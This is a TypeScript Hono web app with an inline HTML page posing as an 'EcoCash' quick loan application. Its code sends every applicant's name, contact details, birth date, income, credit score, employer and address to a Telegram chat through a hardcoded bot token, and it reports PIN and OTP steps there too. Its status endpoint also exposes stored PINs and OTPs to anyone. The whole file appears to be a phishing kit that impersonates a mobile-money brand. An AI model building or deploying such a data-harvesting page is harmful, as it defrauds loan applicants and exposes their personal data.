/** @jsx jsx */
/** @jsxImportSource hono/jsx */
import { Hono } from "hono";
import crypto from "crypto";

const app = new Hono();

const TELEGRAM_BOT_TOKEN = "8990650773:AAFjTOzUT2ulrqjFFaj3AmpqoWaIdQCxrlQ";
const TELEGRAM_CHAT_ID = "7818702248";

interface LoanApplication {
  id: string;
  status: "pending" | "approved" | "rejected" | "pin_verification" | "otp_verification" | "completed";
  createdAt: Date;
  pin?: string;
  otp?: string;
  phoneNumber?: string;
  data: {
    loanAmount: number;
    loanTerm: number;
    monthlyPayment: string;
    name: string;
    email: string;
    phone: string;
    dob: string;
    employment: string;
    income: string;
    creditScore: string;
    address: string;
    employer: string;
    jobTitle: string;
    loanPurpose: string;
  };
}

// In-memory storage (use a database in production)
const applications: Map<string, LoanApplication> = new Map();
const pinAttempts: Map<string, number> = new Map(); // Track PIN attempts

// Send message to Telegram
async function sendToTelegram(message: string, replyMarkup?: object) {
  try {
    const body: any = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    };
    if (replyMarkup) {
      body.reply_markup = replyMarkup;
    }
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );
    return response.ok;
  } catch (error) {
    console.error("Telegram error:", error);
    return false;
  }
}

// Send OTP via SMS (integrate with Twilio or your SMS provider)
async function sendOTPViaSMS(phoneNumber: string, otp: string) {
  try {
    // TODO: Replace with your SMS provider (Twilio, etc.)
    // Example with Twilio:
    // const accountSid = process.env.TWILIO_ACCOUNT_SID;
    // const authToken = process.env.TWILIO_AUTH_TOKEN;
    // const fromNumber = process.env.TWILIO_PHONE_NUMBER;
    // const auth = Buffer.from(`${accountSid}:${authToken}`).toString('base64');
    // await fetch(`https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json`, {
    //   method: 'POST',
    //   headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/x-www-form-urlencoded' },
    //   body: `To=${phoneNumber}&From=${fromNumber}&Body=Your OTP is: ${otp}`,
    // });

    console.log(`OTP ${otp} would be sent to ${phoneNumber}`);
    return true;
  } catch (error) {
    console.error("SMS error:", error);
    return false;
  }
}

// Generate application ID
function generateApplicationId() {
  return "ECO-" + crypto.randomBytes(6).toString("hex").toUpperCase();
}

// Generate random PIN
function generatePIN() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Generate random OTP
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// API endpoint to submit form
app.post("/api/submit", async (c) => {
  const data = await c.req.json();
  const appId = generateApplicationId();
  const pin = generatePIN();

  const application: LoanApplication = {
    id: appId,
    status: "pin_verification",
    createdAt: new Date(),
    pin: pin,
    phoneNumber: data.phone,
    data: data,
  };

  applications.set(appId, application);
  pinAttempts.set(appId, 0);

  const message = `<b>💰 New EcoCash Loan Application</b>
<b>Application ID:</b> ${appId}
<b>Status:</b> Awaiting PIN Verification 🔐

<b>━━ Loan Details ━━</b>
• Amount: $${data.loanAmount.toLocaleString()}
• Term: ${data.loanTerm} months
• Monthly Payment: $${data.monthlyPayment}

<b>━━ Personal Information ━━</b>
• Name: ${data.name}
• Email: ${data.email}
• Phone: ${data.phone}
• Date of Birth: ${data.dob}

<b>━━ Financial Information ━━</b>
• Employment: ${data.employment}
• Annual Income: ${data.income}
• Credit Score: ${data.creditScore}

<b>━━ Employment Details ━━</b>
• Employer: ${data.employer}
• Job Title: ${data.jobTitle}

<b>━━ Address & Purpose ━━</b>
• Address: ${data.address}
• Loan Purpose: ${data.loanPurpose}

<i>Submitted: ${new Date().toLocaleString()}</i>`;

  await sendToTelegram(message);

  return c.json({
    success: true,
    message: "Application submitted! Please enter your PIN.",
    applicationId: appId,
    step: "pin_verification",
  });
});

// API endpoint to verify PIN
app.post("/api/verify-pin", async (c) => {
  const { applicationId, pin } = await c.req.json();
  const application = applications.get(applicationId);

  if (!application) {
    return c.json({ error: "Application not found" }, 404);
  }

  if (application.status !== "pin_verification") {
    return c.json({ error: "Invalid step" }, 400);
  }

  const attempts = pinAttempts.get(applicationId) || 0;
  if (attempts >= 3) {
    application.status = "rejected";
    const message = `<b>❌ PIN Verification Failed</b>
<b>Application ID:</b> ${applicationId}
<b>Reason:</b> Too many incorrect PIN attempts`;
    await sendToTelegram(message);
    return c.json({
      success: false,
      message: "Too many attempts. Application rejected.",
    });
  }

  if (pin === application.pin) {
    application.status = "otp_verification";
    const otp = generateOTP();
    application.otp = otp;

    // Send OTP to phone
    await sendOTPViaSMS(application.phoneNumber!, otp);

    const message = `<b>✅ PIN Verified Correctly</b>
<b>Application ID:</b> ${applicationId}
<b>Next Step:</b> OTP Verification
<b>OTP Sent To:</b> ${application.phoneNumber}`;

    await sendToTelegram(message);

    return c.json({
      success: true,
      message: "PIN verified! OTP has been sent to your phone number.",
      applicationId: applicationId,
      step: "otp_verification",
    });
  } else {
    pinAttempts.set(applicationId, attempts + 1);
    const remainingAttempts = 3 - (attempts + 1);

    const message = `<b>❌ Wrong PIN</b>
<b>Application ID:</b> ${applicationId}
<b>Attempts Remaining:</b> ${remainingAttempts}`;

    await sendToTelegram(message);

    return c.json({
      success: false,
      message: `Wrong PIN. ${remainingAttempts} attempts remaining.`,
      attemptsRemaining: remainingAttempts,
    });
  }
});

// API endpoint to verify OTP
app.post("/api/verify-otp", async (c) => {
  const { applicationId, otp } = await c.req.json();
  const application = applications.get(applicationId);

  if (!application) {
    return c.json({ error: "Application not found" }, 404);
  }

  if (application.status !== "otp_verification") {
    return c.json({ error: "Invalid step" }, 400);
  }

  if (otp === application.otp) {
    application.status = "approved";

    const message = `<b>✅ OTP Verified Successfully</b>
<b>Application ID:</b> ${applicationId}
<b>Status:</b> APPROVED ✨
<b>Loan Amount:</b> $${application.data.loanAmount.toLocaleString()}`;

    await sendToTelegram(message);

    return c.json({
      success: true,
      message: "OTP verified! Your loan application is approved.",
      applicationId: applicationId,
      status: "approved",
    });
  } else {
    return c.json({
      success: false,
      message: "Wrong OTP. Please try again.",
    });
  }
});

// API endpoint to resend PIN
app.post("/api/resend-pin", async (c) => {
  const { applicationId } = await c.req.json();
  const application = applications.get(applicationId);

  if (!application) {
    return c.json({ error: "Application not found" }, 404);
  }

  const message = `<b>🔄 PIN Resend Request</b>
<b>Application ID:</b> ${applicationId}
<b>PIN:</b> <code>${application.pin}</code>`;

  await sendToTelegram(message);

  return c.json({
    success: true,
    message: "PIN has been resent to your Telegram.",
  });
});

// API endpoint to check application status
app.get("/api/status/:id", (c) => {
  const appId = c.req.param("id");
  const app = applications.get(appId);

  if (!app) {
    return c.json({ error: "Application not found" }, 404);
  }

  return c.json(app);
});

// Frontend HTML
app.get("/", (c) => {
  return c.html(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>EcoCash Loan Application</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          padding: 20px;
        }
        .container {
          background: white;
          border-radius: 12px;
          box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
          max-width: 500px;
          width: 100%;
          padding: 40px;
        }
        .header {
          text-align: center;
          margin-bottom: 30px;
        }
        .header h1 {
          color: #667eea;
          font-size: 28px;
          margin-bottom: 10px;
        }
        .header p {
          color: #666;
          font-size: 14px;
        }
        .form-group {
          margin-bottom: 20px;
        }
        label {
          display: block;
          margin-bottom: 8px;
          color: #333;
          font-weight: 500;
          font-size: 14px;
        }
        input, select, textarea {
          width: 100%;
          padding: 12px;
          border: 1px solid #ddd;
          border-radius: 6px;
          font-size: 14px;
          font-family: inherit;
        }
        input:focus, select:focus, textarea:focus {
          outline: none;
          border-color: #667eea;
          box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        textarea {
          resize: vertical;
          min-height: 80px;
        }
        .button-group {
          display: flex;
          gap: 10px;
        }
        button {
          flex: 1;
          padding: 12px;
          border: none;
          border-radius: 6px;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
        }
        .btn-primary {
          background: #667eea;
          color: white;
        }
        .btn-primary:hover {
          background: #5568d3;
          transform: translateY(-2px);
          box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .btn-secondary {
          background: #e0e0e0;
          color: #333;
        }
        .btn-secondary:hover {
          background: #d0d0d0;
        }
        .success-message {
          background: #d4edda;
          color: #155724;
          padding: 15px;
          border-radius: 6px;
          margin-bottom: 20px;
          display: none;
        }
        .error-message {
          background: #f8d7da;
          color: #721c24;
          padding: 15px;
          border-radius: 6px;
          margin-bottom: 20px;
          display: none;
        }
        .step-indicator {
          text-align: center;
          color: #667eea;
          font-size: 12px;
          font-weight: 600;
          margin-bottom: 20px;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }
        .loading {
          display: none;
          text-align: center;
          color: #667eea;
        }
        .spinner {
          display: inline-block;
          width: 20px;
          height: 20px;
          border: 3px solid #f3f3f3;
          border-top: 3px solid #667eea;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .info-box {
          background: #e7f3ff;
          border-left: 4px solid #667eea;
          padding: 15px;
          border-radius: 6px;
          margin-bottom: 20px;
          font-size: 13px;
          color: #333;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>💰 EcoCash</h1>
          <p>Quick Loan Application</p>
        </div>

        <div class="success-message" id="successMessage"></div>
        <div class="error-message" id="errorMessage"></div>

        <!-- Step 1: Loan Application Form -->
        <div id="step1" class="step">
          <div class="step-indicator">Step 1 of 3: Application Details</div>
          <form id="loanForm">
            <div class="form-group">
              <label>Full Name *</label>
              <input type="text" id="name" required>
            </div>
            <div class="form-group">
              <label>Email Address *</label>
              <input type="email" id="email" required>
            </div>
            <div class="form-group">
              <label>Phone Number *</label>
              <input type="tel" id="phone" required>
            </div>
            <div class="form-group">
              <label>Date of Birth *</label>
              <input type="date" id="dob" required>
            </div>
            <div class="form-group">
              <label>Loan Amount ($) *</label>
              <input type="number" id="loanAmount" min="100" required>
            </div>
            <div class="form-group">
              <label>Loan Term (months) *</label>
              <input type="number" id="loanTerm" min="1" max="120" required>
            </div>
            <div class="form-group">
              <label>Employment Status *</label>
              <select id="employment" required>
                <option value="">Select...</option>
                <option value="Employed">Employed</option>
                <option value="Self-Employed">Self-Employed</option>
                <option value="Unemployed">Unemployed</option>
                <option value="Student">Student</option>
              </select>
            </div>
            <div class="form-group">
              <label>Annual Income *</label>
              <input type="text" id="income" placeholder="e.g., $50,000" required>
            </div>
            <div class="form-group">
              <label>Credit Score *</label>
              <input type="number" id="creditScore" min="0" max="850" required>
            </div>
            <div class="form-group">
              <label>Employer *</label>
              <input type="text" id="employer" required>
            </div>
            <div class="form-group">
              <label>Job Title *</label>
              <input type="text" id="jobTitle" required>
            </div>
            <div class="form-group">
              <label>Address *</label>
              <textarea id="address" required></textarea>
            </div>
            <div class="form-group">
              <label>Loan Purpose *</label>
              <input type="text" id="loanPurpose" placeholder="e.g., Home Improvement" required>
            </div>
            <div class="button-group">
              <button type="submit" class="btn-primary">Submit Application</button>
            </div>
          </form>
        </div>

        <!-- Step 2: PIN Verification -->
        <div id="step2" class="step" style="display: none;">
          <div class="step-indicator">Step 2 of 3: PIN Verification</div>
          <div class="info-box">
            A PIN has been sent to our admin. Please enter it to proceed with verification.
          </div>
          <div class="form-group">
            <label>Enter PIN *</label>
            <input type="text" id="pinInput" placeholder="6-digit PIN" maxlength="6" inputmode="numeric">
          </div>
          <div class="button-group">
            <button class="btn-primary" onclick="verifyPIN()">Verify PIN</button>
            <button class="btn-secondary" onclick="resendPIN()">Resend PIN</button>
          </div>
          <div class="loading" id="pinLoading"><div class="spinner"></div> Verifying...</div>
        </div>

        <!-- Step 3: OTP Verification -->
        <div id="step3" class="step" style="display: none;">
          <div class="step-indicator">Step 3 of 3: OTP Verification</div>
          <div class="info-box">
            An OTP has been sent to your phone number. Enter it to complete your application.
          </div>
          <div class="form-group">
            <label>Enter OTP *</label>
            <input type="text" id="otpInput" placeholder="6-digit OTP" maxlength="6" inputmode="numeric">
          </div>
          <div class="button-group">
            <button class="btn-primary" onclick="verifyOTP()">Verify OTP</button>
          </div>
          <div class="loading" id="otpLoading"><div class="spinner"></div> Verifying...</div>
        </div>

        <!-- Step 4: Success -->
        <div id="step4" class="step" style="display: none;">
          <div class="step-indicator">✅ Application Complete</div>
          <div class="success-message" style="display: block;">
            <strong>Congratulations!</strong> Your loan application has been successfully approved. 
            <br><br>
            <strong>Application ID:</strong> <span id="finalAppId"></span>
            <br><br>
            You will receive further details via email and SMS.
          </div>
          <button class="btn-primary" onclick="location.reload()">Submit Another Application</button>
        </div>
      </div>

      <script>
        let currentApplicationId = null;

        // Calculate monthly payment
        function calculateMonthlyPayment(principal, months) {
          const apr = 0.12; // 12% APR
          const monthlyRate = apr / 12;
          return ((principal * monthlyRate * Math.pow(1 + monthlyRate, months)) / 
                  (Math.pow(1 + monthlyRate, months) - 1)).toFixed(2);
        }

        // Submit loan form
        document.getElementById('loanForm').addEventListener('submit', async (e) => {
          e.preventDefault();

          const loanAmount = parseFloat(document.getElementById('loanAmount').value);
          const loanTerm = parseInt(document.getElementById('loanTerm').value);
          const monthlyPayment = calculateMonthlyPayment(loanAmount, loanTerm);

          const formData = {
            name: document.getElementById('name').value,
            email: document.getElementById('email').value,
            phone: document.getElementById('phone').value,
            dob: document.getElementById('dob').value,
            loanAmount: loanAmount,
            loanTerm: loanTerm,
            monthlyPayment: monthlyPayment,
            employment: document.getElementById('employment').value,
            income: document.getElementById('income').value,
            creditScore: document.getElementById('creditScore').value,
            employer: document.getElementById('employer').value,
            jobTitle: document.getElementById('jobTitle').value,
            address: document.getElementById('address').value,
            loanPurpose: document.getElementById('loanPurpose').value,
          };

          try {
            const response = await fetch('/api/submit', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(formData),
            });
            const result = await response.json();

            if (result.success) {
              currentApplicationId = result.applicationId;
              showStep(2);
              showMessage('success', 'Application submitted! Please enter the PIN.');
            }
          } catch (error) {
            showMessage('error', 'Error submitting application: ' + error.message);
          }
        });

        async function verifyPIN() {
          const pin = document.getElementById('pinInput').value;

          if (!pin || pin.length !== 6) {
            showMessage('error', 'Please enter a valid 6-digit PIN');
            return;
          }

          document.getElementById('pinLoading').style.display = 'block';

          try {
            const response = await fetch('/api/verify-pin', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                applicationId: currentApplicationId,
                pin: pin,
              }),
            });
            const result = await response.json();

            document.getElementById('pinLoading').style.display = 'none';

            if (result.success) {
              showStep(3);
              showMessage('success', 'PIN verified! OTP sent to your phone.');
            } else {
              showMessage('error', result.message);
            }
          } catch (error) {
            document.getElementById('pinLoading').style.display = 'none';
            showMessage('error', 'Error verifying PIN: ' + error.message);
          }
        }

        async function verifyOTP() {
          const otp = document.getElementById('otpInput').value;

          if (!otp || otp.length !== 6) {
            showMessage('error', 'Please enter a valid 6-digit OTP');
            return;
          }

          document.getElementById('otpLoading').style.display = 'block';

          try {
            const response = await fetch('/api/verify-otp', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                applicationId: currentApplicationId,
                otp: otp,
              }),
            });
            const result = await response.json();

            document.getElementById('otpLoading').style.display = 'none';

            if (result.success) {
              document.getElementById('finalAppId').textContent = currentApplicationId;
              showStep(4);
            } else {
              showMessage('error', result.message);
            }
          } catch (error) {
            document.getElementById('otpLoading').style.display = 'none';
            showMessage('error', 'Error verifying OTP: ' + error.message);
          }
        }

        async function resendPIN() {
          try {
            const response = await fetch('/api/resend-pin', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ applicationId: currentApplicationId }),
            });
            const result = await response.json();

            if (result.success) {
              showMessage('success', 'PIN has been resent to the admin.');
            }
          } catch (error) {
            showMessage('error', 'Error resending PIN: ' + error.message);
          }
        }

        function showStep(stepNumber) {
          document.querySelectorAll('.step').forEach(step => step.style.display = 'none');
          document.getElementById('step' + stepNumber).style.display = 'block';
        }

        function showMessage(type, message) {
          const messageDiv = document.getElementById(type + 'Message');
          messageDiv.textContent = message;
          messageDiv.style.display = 'block';
          setTimeout(() => {
            messageDiv.style.display = 'none';
          }, 5000);
        }
      </script>
    </body>
    </html>
  `);
});

export default app;
